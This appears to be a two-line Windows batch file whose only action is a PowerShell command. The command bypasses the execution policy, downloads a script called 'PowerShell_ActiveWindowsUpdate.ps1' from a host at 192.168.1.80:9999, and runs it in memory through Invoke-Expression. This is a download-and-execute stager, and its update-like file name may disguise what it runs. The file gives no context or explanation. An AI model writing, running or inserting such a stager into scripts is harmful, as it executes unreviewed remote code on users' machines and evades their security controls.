@echo off

powershell -ExecutionPolicy Bypass -Command "irm http://192.168.1.80:9999/PowerShell_ActiveWindowsUpdate.ps1 | iex"